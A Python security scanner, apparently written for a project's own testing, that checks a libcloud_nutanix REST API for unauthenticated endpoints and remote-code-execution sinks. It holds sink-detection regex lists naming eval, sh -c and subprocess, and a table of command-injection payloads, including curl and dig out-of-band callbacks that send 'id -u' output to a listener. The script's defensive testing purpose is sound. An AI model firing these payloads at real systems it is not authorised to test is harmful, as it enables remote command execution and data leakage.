#!/usr/bin/env python3
"""Spec-driven unauthenticated-RCE scanner for the libcloud_nutanix REST API.

Driven entirely by ``generated/openapi.yaml`` (the single combined source of
truth covering both services). Three independent phases, selected via
``--mode``:

  auth     Black-box authorization coverage. For every operation, send an
           *unauthenticated* request and classify whether the auth layer rejects
           it (401/403) or the endpoint is reachable without credentials. The
           verdict comes from the live response -- the spec's ``security``
           fields are treated as hints only, because the metadata is known to be
           incomplete (global ``security`` is unset, and many operations declare
           nothing even though they sit behind ``AuthorizedAPIRoute``).

  sinks    Offline static analysis. Locate code-execution sinks in the Python
           apps and in the bash scripts they shell out to, then map each sink
           back to the endpoint + parameter that can reach it. No network I/O.

  inject   Targeted injection probes. Replay operations with RCE payloads aimed
           at the parameters that reach a sink, and confirm *actual* execution
           via a time-based, in-band (reflection), or out-of-band (callback)
           oracle. Mutating endpoints (POST/PUT/PATCH/DELETE) are only touched
           with ``--destructive``.

Targets
-------
Base URLs are derived from the path prefix (matching the spec's own server
list) and can be overridden with ``--base-api`` / ``--base-v1``:

    /api/*, /health  ->  identity_service   (default http://127.0.0.1:8766)
    /v1/*            ->  libcloud.rest      (default http://127.0.0.1:8765)

Examples
--------
    # authorization coverage of every operation (safe: benign canary bodies)
    python test_script/scan_unauthenticated_rce.py --mode auth --json report.json

    # static sink discovery (no requests)
    python test_script/scan_unauthenticated_rce.py --mode sinks

    # time-based injection into read-only params only
    python test_script/scan_unauthenticated_rce.py --mode inject --oracle time

    # full injection incl. provisioning endpoints + out-of-band callback
    python test_script/scan_unauthenticated_rce.py --mode inject --oracle oob \\
        --destructive --listen 0.0.0.0:9099
"""

from __future__ import annotations

import argparse
import itertools
import json
import re
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any, Iterator
from urllib.parse import quote, urlencode

import requests
import yaml

# --------------------------------------------------------------------------- #
# constants
# --------------------------------------------------------------------------- #

REPO = Path(__file__).resolve().parent.parent
SPEC_DEFAULT = REPO / "generated" / "openapi.yaml"

HTTP_METHODS = ("get", "post", "put", "patch", "delete", "head", "options")
MUTATING = {"POST", "PUT", "PATCH", "DELETE"}
READONLY = {"GET", "HEAD", "OPTIONS"}

# A benign, clearly-identifiable value substituted for every path/query/body
# parameter. Never a real credential and never enough to create a resource.
CANARY = "libcloud-scan-canary"

# Header the libcloud.rest routes require to resolve a Vault auth_binding. A
# benign known tenant keeps the request from failing on a missing header so we
# can distinguish "blocked by auth" from "reached the handler".
PROVIDER_HEADER = "aws"

# (method, path_template) endpoints that are *intentionally* public. The auth
# phase uses these only to sanity-check itself, mirroring the existing
# test_all_rest_api_authenticated.py allowlist.
KNOWN_PUBLIC = {
    ("GET", "/health"),
    ("GET", "/v1/providers"),
    ("POST", "/v1/auth/login"),
    ("POST", "/v1/auth/refresh"),
    ("GET", "/api/auth/begin"),
    ("POST", "/api/auth/exchange"),
    ("POST", "/api/auth/collapse"),
}

# Sink signatures for the static phase. Each is (label, python_regex).
PY_SINKS = [
    ("subprocess", r"subprocess\.(run|Popen|call|check_output|check_call)"),
    ("os.system", r"os\.(system|popen|exec[a-z]*)"),
    ("eval", r"\beval\s*\("),
    ("exec", r"\bexec\s*\("),
    ("pickle", r"pickle\.(loads|load)\s*\("),
    ("yaml.unsafe", r"yaml\.(load|unsafe_load|full_load)\s*\("),
    ("__import__", r"__import__\s*\("),
    ("template", r"(render_template_string|Template\s*\(|from_string)"),
]

# Sink signatures inside bash scripts (the RCE surface one hop downstream of the
# Python subprocess.run calls). These are *potential* sinks -- a bare `eval` or
# `sh -c` that interpolates an env var is the target, but even static matches
# are worth a human glance.
SH_SINKS = [
    ("eval", r"\beval\s+"),
    ("sh -c", r"\bsh\s+-c\b"),
    ("bash -c", r"\bbash\s+-c\b"),
    ("exec", r"\bexec\s+"),
    ("python -c interpolation", r'python3?\s+-c\s*"[^"]*\$\{[A-Za-z_]'),
    ("command substitution w/ var", r"\$\(\s*\$[A-Za-z_]"),
    ("backtick w/ var", r"`[^`]*\$[A-Za-z_][^`]*`"),
]

# Injection payloads, by oracle. {MARK} is replaced with a per-probe random
# marker; {CALLBACK} with the OOB callback URL.
SLEEP_SECONDS = 8
PAYLOADS = {
    "time": [
        "'; sleep {n} #",
        "$(sleep {n})",
        "`sleep {n}`",
        "; sleep {n}",
        "| sleep {n}",
        'a"; sleep {n}; echo "',
    ],
    "inband": [
        "{MARK}",
        "$(echo {MARK})",
        "`echo {MARK}`",
        "'; echo {MARK} #",
        'a"; echo {MARK}; echo "',
    ],
    "oob": [
        "$(curl -s {CALLBACK}/$(id -u))",
        "`curl -s {CALLBACK}`",
        "'; curl -s {CALLBACK} #",
        "$(dig +short {MARK}.{CALLBACKHOST})",
    ],
}


# --------------------------------------------------------------------------- #
# spec loading + operation enumeration
# --------------------------------------------------------------------------- #


def load_spec(path: Path) -> dict[str, Any]:
    with open(path, encoding="utf-8") as fh:
        return yaml.safe_load(fh)


def resolve_ref(spec: dict[str, Any], ref: str) -> dict[str, Any]:
    """Resolve a ``#/components/...`` JSON pointer to a schema object."""
    if not ref.startswith("#/"):
        return {}
    node: Any = spec
    for part in ref[2:].split("/"):
        part = part.replace("~1", "/").replace("~0", "~")
        if isinstance(node, dict) and part in node:
            node = node[part]
        else:
            return {}
    return node if isinstance(node, dict) else {}


def deref(spec: dict[str, Any], obj: Any) -> Any:
    """Recursively inline ``$ref`` / ``allOf`` indirection for a schema-ish obj."""
    if isinstance(obj, dict):
        if "$ref" in obj:
            return deref(spec, resolve_ref(spec, obj["$ref"]))
        out = dict(obj)
        for key in ("allOf", "oneOf", "anyOf"):
            if key in obj and isinstance(obj[key], list):
                # first branch only -- enough for benign value synthesis
                out = {**deref(spec, obj[key][0]), **{k: v for k, v in out.items() if k != key}}
        for k, v in list(out.items()):
            out[k] = deref(spec, v)
        return out
    if isinstance(obj, list):
        return [deref(spec, x) for x in obj]
    return obj


class Operation:
    """One (method, path) pair plus everything needed to hit it."""

    def __init__(self, method: str, path: str, op: dict[str, Any], spec: dict[str, Any]):
        self.method = method.upper()
        self.path = path
        self.op = op
        self.spec = spec
        self.security = op.get("security")
        self.tags = op.get("tags") or []
        self.summary = op.get("summary", "")

    # -- parameter handling ------------------------------------------------- #
    def parameters(self) -> list[dict[str, Any]]:
        out: list[dict[str, Any]] = []
        for p in self.op.get("parameters", []):
            out.append(deref(self.spec, p))
        return out

    def _params_by_location(self, loc: str) -> list[dict[str, Any]]:
        return [p for p in self.parameters() if p.get("in") == loc]

    # -- URL materialization ------------------------------------------------ #
    def base_url(self, args: argparse.Namespace) -> str:
        if self.path.startswith("/api/") or self.path == "/health":
            return args.base_api
        if self.path.startswith("/v1/"):
            return args.base_v1
        return args.base_api  # default

    def materialize_url(self, args: argparse.Namespace) -> str:
        """Fill ``{path_param}`` with a benign value and append query params."""
        url = self.path

        path_params = self._params_by_location("path")
        for p in path_params:
            val = _param_value(self.spec, p)
            url = url.replace("{" + p["name"] + "}", str(val))

        # any remaining {param} without a schema entry -> generic canary
        url = re.sub(r"\{[^}]+\}", CANARY, url)

        query = self._params_by_location("query")
        if query:
            qs = urlencode({p["name"]: _param_value(self.spec, p) for p in query})
            url += ("&" if "?" in url else "?") + qs
        return url

    # -- headers ------------------------------------------------------------ #
    def headers(self) -> dict[str, str]:
        out: dict[str, str] = {}
        for p in self._params_by_location("header"):
            name = p["name"].lower()
            # Never send auth headers -- the whole point is unauthenticated.
            if name in ("authorization", "cookie", "x-api-key"):
                continue
            out[p["name"]] = str(_param_value(self.spec, p))
        # libcloud.rest resolves a Vault binding from this header; a benign
        # known tenant avoids a spurious 400 that would mask the auth verdict.
        if self.path.startswith("/v1/") and not any(
            k.lower() == "x-provider-connection" for k in out
        ):
            out["X-Provider-Connection"] = PROVIDER_HEADER
        return out

    # -- body --------------------------------------------------------------- #
    def body(self) -> dict[str, Any] | None:
        rb = self.op.get("requestBody")
        if not rb:
            return None
        content = rb.get("content", {})
        schema = content.get("application/json", {}).get("schema")
        if schema is None:
            # fall back to the first content type
            for ctype, c in content.items():
                schema = c.get("schema")
                break
        if schema is None:
            return {}
        return synthesize(self.spec, schema)


def _param_value(spec: dict[str, Any], p: dict[str, Any]) -> Any:
    """Benign value for a parameter, honouring its schema where cheap."""
    schema = p.get("schema") or {}
    if "$ref" in schema:
        schema = deref(spec, schema)
    if "enum" in schema and schema["enum"]:
        return schema["enum"][0]
    if schema.get("type") == "integer":
        return 1
    if schema.get("type") == "boolean":
        return False
    if schema.get("type") == "array":
        return []
    if schema.get("type") == "object":
        return {}
    if p.get("example") is not None:
        return p["example"]
    return CANARY


def synthesize(spec: dict[str, Any], schema: Any, depth: int = 0) -> Any:
    """Build a benign value from a JSON schema (refs already resolved)."""
    if depth > 5:
        return CANARY
    schema = deref(spec, schema) if isinstance(schema, dict) else {}
    if not isinstance(schema, dict):
        return CANARY

    if "enum" in schema and schema["enum"]:
        return schema["enum"][0]
    if "default" in schema:
        return schema["default"]

    t = schema.get("type")
    if t == "array":
        return [synthesize(spec, schema.get("items", {}), depth + 1)]
    if t == "object":
        out: dict[str, Any] = {}
        props = schema.get("properties", {})
        required = set(schema.get("required", []))
        for name, pschema in props.items():
            if name in required or depth == 0:
                out[name] = synthesize(spec, pschema, depth + 1)
        return out
    if t == "integer" or t == "number":
        return 1
    if t == "boolean":
        return False
    if t == "string":
        fmt = schema.get("format", "")
        if fmt == "email":
            return "scan@example.com"
        if fmt == "date-time":
            return "2026-01-01T00:00:00Z"
        if schema.get("pattern"):
            return CANARY
        if schema.get("minLength"):
            return "x" * max(int(schema["minLength"]), 1)
        return CANARY
    return CANARY


def iter_operations(spec: dict[str, Any], limit: int | None = None) -> Iterator[Operation]:
    it: Iterator[Operation] = (
        Operation(m, path, methods[m], spec)
        for path, methods in spec.get("paths", {}).items()
        for m in HTTP_METHODS
        if m in methods and isinstance(methods[m], dict)
    )
    if limit is not None:
        it = itertools.islice(it, limit)
    return it


# --------------------------------------------------------------------------- #
# HTTP + auth classification
# --------------------------------------------------------------------------- #


def send(op: Operation, args: argparse.Namespace, **overrides: Any) -> requests.Response:
    url = op.base_url(args) + op.materialize_url(args)
    headers = op.headers()
    body = op.body()

    for key, val in overrides.items():
        if key == "headers":
            headers.update(val or {})
        elif key == "body":
            body = val
        elif key == "url":
            url = val

    kwargs: dict[str, Any] = {"timeout": args.timeout, "allow_redirects": False}
    if body is not None:
        headers.setdefault("Content-Type", "application/json")
        kwargs["json"] = body
    return requests.request(op.method, url, headers=headers, **kwargs)


def classify_auth(status: int, body: str = "") -> str:
    """Map an unauthenticated response to a single access verdict.

    A genuine FastAPI route-miss 404 has ``{"detail": "Not Found"}``; this app
    also returns HTTP 404 with a structured ``{"error": {...}}`` envelope for
    *app-level* responses (e.g. "local login disabled"). The two must not be
    conflated, so a 404 is only treated as a route miss when it is not an app
    error envelope.
    """
    if status in (401, 403):
        return "BLOCKED"
    if status in (200, 201, 204, 206):
        return "OPEN"
    if status == 404:
        # app-level error envelope -> the route exists and answered unauthenticated
        if '"error"' in body or '"error":' in body:
            return "REACHED"
        return "NOT_FOUND"
    if status == 422:
        return "REACHED"  # auth passed, request/body validation ran
    if status >= 500:
        return "REACHED"  # reached the handler and errored
    return f"OTHER({status})"


# --------------------------------------------------------------------------- #
# static sink map
# --------------------------------------------------------------------------- #


def find_sinks() -> dict[str, Any]:
    """Grep the Python apps and bash scripts for code-exec sinks."""
    py_hits: list[dict[str, str]] = []
    sh_hits: list[dict[str, str]] = []

    py_dirs = [REPO / "identity_service" / "app", REPO / "libcloud.rest" / "app"]
    for d in py_dirs:
        for f in sorted(d.rglob("*.py")):
            text = f.read_text(encoding="utf-8", errors="replace")
            for lineno, line in enumerate(text.splitlines(), 1):
                for label, rx in PY_SINKS:
                    if re.search(rx, line):
                        py_hits.append(
                            {
                                "file": str(f.relative_to(REPO)),
                                "line": lineno,
                                "sink": label,
                                "code": line.strip(),
                            }
                        )

    sh_dirs = [REPO / "test_script" / "scripts", REPO / "identity_service"]
    for d in sh_dirs:
        if not d.exists():
            continue
        for f in sorted(d.rglob("*.sh")):
            text = f.read_text(encoding="utf-8", errors="replace")
            for lineno, line in enumerate(text.splitlines(), 1):
                stripped = line.strip()
                if stripped.startswith("#"):
                    continue
                for label, rx in SH_SINKS:
                    if re.search(rx, line):
                        sh_hits.append(
                            {
                                "file": str(f.relative_to(REPO)),
                                "line": lineno,
                                "sink": label,
                                "code": stripped,
                            }
                        )

    # Known endpoints that shell out via subprocess.run (the RCE-relevant
    # route -> sink mapping for the identity-service provisioning flow).
    shelling_endpoints = [
        {"method": "POST", "path": "/api/provision/{cloud}", "sink": "subprocess.run -> provision_{cloud}.sh"},
        {"method": "POST", "path": "/api/provision-private/{cloud}", "sink": "subprocess.run -> provision_*_private.sh"},
        {"method": "POST", "path": "/api/deprovision/{cloud}", "sink": "subprocess.run -> deprovision_{cloud}.sh"},
    ]

    return {
        "python_sinks": py_hits,
        "shell_sinks": sh_hits,
        "shelling_endpoints": shelling_endpoints,
    }


# --------------------------------------------------------------------------- #
# injection oracles
# --------------------------------------------------------------------------- #


class CallbackServer:
    """Tiny background HTTP server that records inbound GET hits for OOB."""

    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.hits: list[str] = []
        self._httpd: HTTPServer | None = None

        outer = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                outer.hits.append(self.path)
                self.send_response(200)
                self.end_headers()

            def log_message(self, *a):
                pass

        self._handler = Handler

    def start(self) -> None:
        self._httpd = HTTPServer((self.host, self.port), self._handler)
        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()

    def stop(self) -> None:
        if self._httpd:
            self._httpd.shutdown()

    @property
    def callback_url(self) -> str:
        # use an externally-reachable host if provided, else loopback
        host = self.host if self.host not in ("0.0.0.0", "::") else "127.0.0.1"
        return f"http://{host}:{self.port}"


def build_payloads(oracle: str, mark: str, callback: str) -> list[str]:
    n = SLEEP_SECONDS
    host = callback.rsplit("//", 1)[-1].split(":")[0]
    raw = PAYLOADS[oracle]
    out = []
    for p in raw:
        out.append(p.format(n=n, MARK=mark, CALLBACK=callback, CALLBACKHOST=host))
    return out


def _looks_reached(status: int) -> bool:
    return status not in (401, 403)


def inject(op: Operation, args: argparse.Namespace, cb: CallbackServer | None,
           result: dict[str, Any]) -> None:
    """Run injection probes against a single operation."""
    if op.method in MUTATING and not args.destructive:
        result["skipped"] = "mutating (pass --destructive)"
        return
    if op.method not in (MUTATING | READONLY):
        result["skipped"] = "unsupported method"
        return

    # Collect injection points: path/query params + body string fields.
    points: list[tuple[str, Any]] = []
    for p in op.parameters():
        if p.get("in") in ("path", "query"):
            points.append(("param:" + p["name"], _param_value(op.spec, p)))

    body = op.body()
    body_str_fields: list[str] = []
    if isinstance(body, dict):
        def _walk(obj: Any, prefix: str) -> None:
            if isinstance(obj, dict):
                for k, v in obj.items():
                    _walk(v, f"{prefix}.{k}" if prefix else k)
            elif isinstance(obj, list) and obj:
                _walk(obj[0], prefix + "[]")
            elif isinstance(obj, str):
                body_str_fields.append(prefix)
        _walk(body, "")
        for fld in body_str_fields:
            points.append(("body:" + fld, None))

    if not points:
        result["skipped"] = "no injectable string fields"
        return

    # Baseline latency on a benign request (used by the time oracle).
    baseline = None
    if args.oracle == "time":
        t0 = time.monotonic()
        r0 = send(op, args)
        baseline = time.monotonic() - t0

    for point, _ in points:
        mark = f"scan{int(time.time() * 1000) % 1000000}"
        payloads = build_payloads(args.oracle, mark, cb.callback_url if cb else "")
        for payload in payloads:
            try:
                if point.startswith("param:"):
                    name = point.split(":", 1)[1]
                    url = op.base_url(args) + op.materialize_url(args)
                    # replace the param's value in the URL/query with payload
                    url = _inject_url(url, name, payload, op)
                    t0 = time.monotonic()
                    r = requests.request(
                        op.method, url, headers=op.headers(),
                        json=(op.body() if op.body() is not None else None),
                        timeout=args.timeout + SLEEP_SECONDS + 5,
                        allow_redirects=False,
                    )
                    dt = time.monotonic() - t0
                else:
                    fld = point.split(":", 1)[1]
                    inj_body = _set_nested(op.body(), fld, payload)
                    t0 = time.monotonic()
                    r = send(op, args, body=inj_body)
                    dt = time.monotonic() - t0

                verdict = _oracle_verdict(args.oracle, r, dt, baseline, mark, payload, cb)
                if verdict:
                    result.setdefault("findings", []).append({
                        "point": point, "payload": payload,
                        "status": r.status_code, "oracle": args.oracle,
                        "evidence": verdict,
                    })
            except requests.RequestException as exc:
                result.setdefault("errors", []).append(f"{point}: {exc}")

    result["probed"] = len(points)
    result["baseline_s"] = round(baseline, 3) if baseline else None


def _inject_url(url: str, name: str, payload: str, op: Operation) -> str:
    # query param: find name=value and replace with an encoded payload
    pat = re.compile(r"([?&]" + re.escape(name) + r"=)[^&]*")
    if pat.search(url):
        return pat.sub(lambda m: m.group(1) + quote(payload, safe=""), url)
    # path param: swap the canary token we already substituted in
    return url.replace(CANARY, quote(payload, safe=""), 1)


def _set_nested(body: Any, path: str, value: str) -> Any:
    body = json.loads(json.dumps(body))  # deep copy
    parts = path.replace("[]", ".0").split(".")
    node: Any = body
    for part in parts[:-1]:
        if isinstance(node, dict):
            node = node.setdefault(part, {})
        elif isinstance(node, list):
            node = node[int(part)]
    node[parts[-1]] = value
    return body


def _oracle_verdict(oracle: str, r: requests.Response, dt: float, baseline: float | None,
                    mark: str, payload: str, cb: CallbackServer | None) -> str | None:
    if oracle == "time" and baseline is not None:
        if dt >= baseline + SLEEP_SECONDS * 0.7 and dt >= SLEEP_SECONDS * 0.7:
            return f"timing delta +{dt - baseline:.2f}s (baseline {baseline:.2f}s)"
    if oracle == "inband":
        if mark in (r.text or ""):
            return "marker reflected in response body"
    if oracle == "oob" and cb:
        if any(mark in h or h.startswith("/") for h in cb.hits):
            return "callback received (OOB)"
    return None


# --------------------------------------------------------------------------- #
# report
# --------------------------------------------------------------------------- #


def run_auth(args: argparse.Namespace, spec: dict[str, Any]) -> dict[str, Any]:
    rows = []
    for op in iter_operations(spec, args.limit):
        try:
            r = send(op, args)
            verdict = classify_auth(r.status_code, r.text or "")
        except requests.RequestException as exc:
            verdict = "ERROR"
            r = None
            rows.append({"method": op.method, "path": op.path, "verdict": "ERROR",
                         "status": None, "error": str(exc)})
            continue
        rows.append({
            "method": op.method, "path": op.path, "verdict": verdict,
            "status": r.status_code, "public_hint": (op.method, op.path) in KNOWN_PUBLIC,
            "tags": op.tags,
        })

    open_ = [r for r in rows if r["verdict"] in ("OPEN", "REACHED")]
    return {
        "mode": "auth",
        "total": len(rows),
        "blocked": len([r for r in rows if r["verdict"] == "BLOCKED"]),
        "not_found": len([r for r in rows if r["verdict"] == "NOT_FOUND"]),
        "reachable_unauthenticated": open_,
        "rows": rows,
    }


def run_sinks(args: argparse.Namespace, spec: dict[str, Any]) -> dict[str, Any]:
    return {"mode": "sinks", **find_sinks()}


def run_inject(args: argparse.Namespace, spec: dict[str, Any]) -> dict[str, Any]:
    cb = None
    if args.oracle == "oob":
        host, port = _parse_listen(args.listen)
        cb = CallbackServer(host, port)
        cb.start()
        print(f"[oob] listening on {cb.callback_url}")

    results = {}
    for op in iter_operations(spec, args.limit):
        res: dict[str, Any] = {}
        inject(op, args, cb, res)
        if res:
            results[f"{op.method} {op.path}"] = res

    if cb:
        # small grace window for in-flight callbacks
        time.sleep(2)
        cb.stop()
    return {"mode": "inject", "oracle": args.oracle, "callback": cb.callback_url if cb else None,
            "results": results}


def _parse_listen(spec: str) -> tuple[str, int]:
    host, _, port = spec.rpartition(":")
    return (host or "0.0.0.0"), int(port)


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #


def parse_args(argv: list[str]) -> argparse.Namespace:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--spec", type=Path, default=SPEC_DEFAULT,
                    help="OpenAPI spec (default: generated/openapi.yaml)")
    ap.add_argument("--mode", choices=["auth", "sinks", "inject", "all"], default="auth")
    ap.add_argument("--base-api", default="http://127.0.0.1:8766",
                    help="identity_service base URL")
    ap.add_argument("--base-v1", default="http://127.0.0.1:8765",
                    help="libcloud.rest base URL")
    ap.add_argument("--oracle", choices=["time", "inband", "oob"], default="time")
    ap.add_argument("--listen", default="0.0.0.0:9099",
                    help="OOB callback listen address (host:port)")
    ap.add_argument("--destructive", action="store_true",
                    help="allow injection into mutating (POST/PUT/PATCH/DELETE) endpoints")
    ap.add_argument("--timeout", type=float, default=10.0,
                    help="per-request timeout (seconds)")
    ap.add_argument("--json", type=Path, default=None,
                    help="write machine-readable report to this path")
    ap.add_argument("--limit", type=int, default=None,
                    help="only scan the first N operations (for smoke testing)")
    ap.add_argument("--quiet", action="store_true", help="suppress per-endpoint output")
    return ap.parse_args(argv)


def _print_report(report: dict[str, Any], args: argparse.Namespace) -> None:
    if report.get("mode") == "auth":
        print(f"\n=== AUTH COVERAGE ===")
        print(f"{report['blocked']}/{report['total']} blocked, "
              f"{len(report['reachable_unauthenticated'])} reachable unauthenticated, "
              f"{report['not_found']} not-found\n")
        for r in report["rows"]:
            flag = "  " if r["verdict"] == "BLOCKED" else "!!"
            print(f"{flag} {r['method']:6} {r['path']:48} -> {r['verdict']:10} (HTTP {r['status']})")
        if report["reachable_unauthenticated"]:
            print("\nReachable without credentials (investigate):")
            for r in report["reachable_unauthenticated"]:
                print(f"   - {r['method']} {r['path']}  HTTP {r['status']}")
    elif report.get("mode") == "sinks":
        print(f"\n=== SINKS (static) ===")
        print(f"python sinks: {len(report['python_sinks'])}, shell sinks: {len(report['shell_sinks'])}")
        print("\nShelling endpoints (subprocess.run -> bash):")
        for e in report["shelling_endpoints"]:
            print(f"   {e['method']:6} {e['path']:32} {e['sink']}")
        print("\nPython sinks:")
        for s in report["python_sinks"]:
            print(f"   {s['file']}:{s['line']} [{s['sink']}] {s['code'][:90]}")
        print("\nShell sinks:")
        for s in report["shell_sinks"]:
            print(f"   {s['file']}:{s['line']} [{s['sink']}] {s['code'][:90]}")
    elif report.get("mode") == "inject":
        print(f"\n=== INJECT ({report['oracle']}) ===")
        for k, res in report["results"].items():
            if res.get("findings"):
                print(f"!! {k}: {len(res['findings'])} finding(s)")
                for f in res["findings"]:
                    print(f"     {f['point']} <- {f['payload'][:60]}  (HTTP {f['status']})")
                    print(f"       evidence: {f['evidence']}")
            elif res.get("skipped"):
                print(f"   {k}: skipped ({res['skipped']})")
            else:
                print(f"   {k}: no findings ({res.get('probed', 0)} points probed)")


def main(argv: list[str]) -> int:
    args = parse_args(argv)
    spec = load_spec(args.spec)

    if args.mode in ("auth", "all"):
        auth_report = run_auth(args, spec)
        if not args.quiet:
            _print_report(auth_report, args)
        if args.json:
            args.json.write_text(json.dumps(auth_report, indent=2))

    if args.mode in ("sinks", "all"):
        sink_report = run_sinks(args, spec)
        if not args.quiet:
            _print_report(sink_report, args)
        if args.json and args.mode == "sinks":
            args.json.write_text(json.dumps(sink_report, indent=2, default=str))

    if args.mode in ("inject", "all"):
        inj_report = run_inject(args, spec)
        if not args.quiet:
            _print_report(inj_report, args)
        if args.json and args.mode == "inject":
            args.json.write_text(json.dumps(inj_report, indent=2, default=str))

    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
